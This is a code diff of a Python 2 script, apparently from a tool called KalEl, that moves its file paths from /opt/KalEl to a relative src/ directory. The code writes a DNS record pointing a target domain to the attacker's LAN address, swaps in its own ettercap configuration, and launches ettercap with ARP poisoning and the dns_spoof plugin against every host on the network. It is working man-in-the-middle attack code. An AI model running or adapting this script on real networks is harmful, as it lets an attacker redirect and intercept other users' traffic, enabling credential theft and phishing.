@@ -19,9 +19,9 @@ class bcolors:
 #Verify System and clean up afterlast usage
 from pathlib2 import Path
 
-file1 = Path("/opt/KalEl/etter.dns")
+file1 = Path("src/etter.dns")
 if file1.is_file():
-    subprocess.call(['rm', '/opt/KalEl/etter.dns'])
+    subprocess.call(['rm', 'src/etter.dns'])
 else:
     pass
 
@@ -57,7 +57,7 @@ print("Target address %s.") % target
 print bcolors.ENDC
 
 #Writes out the config to etter.dns
-with open('etter.dns', 'w+') as f:
+with open('src/etter.dns', 'w+') as f:
     f.writelines(target)
     f.write(' A ')
     f.writelines(lanip+'\n')
@@ -66,11 +66,11 @@ print("Backing up ettercap config and creating our own")
 
 #Ettercap Config (etter.dns)
 subprocess.call(['mv', '/etc/ettercap/etter.conf', '/etc/ettercap/etter.conf.bak'])
-subprocess.call(['cp', '/opt/KalEl/etter.conf', '/etc/ettercap/etter.conf'])
+subprocess.call(['cp', 'src/etter.conf', '/etc/ettercap/etter.conf'])
 
 #Ettercap DNS config (etter.dns)
 subprocess.call(['mv', '/etc/ettercap/etter.dns', '/etc/ettercap/etter.dns.bak'])
-subprocess.call(['cp', '/opt/KalEl/etter.dns', '/etc/ettercap/etter.dns'])
+subprocess.call(['cp', 'src/etter.dns', '/etc/ettercap/etter.dns'])
 print 'Done!'
 
 print bcolors.WARNING
@@ -82,7 +82,7 @@ print("#### NB: CTRL + C IS DISAPPRECIATED, USE Q FOR QUIT INSTEAD! ####")
 print bcolors.ENDC
 time.sleep(1)
 
-if os.path.isfile('/opt/KalEl/src/config.py'):
+if os.path.isfile('src/config.py'):
     from src.config import etterdir
     subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
 else:
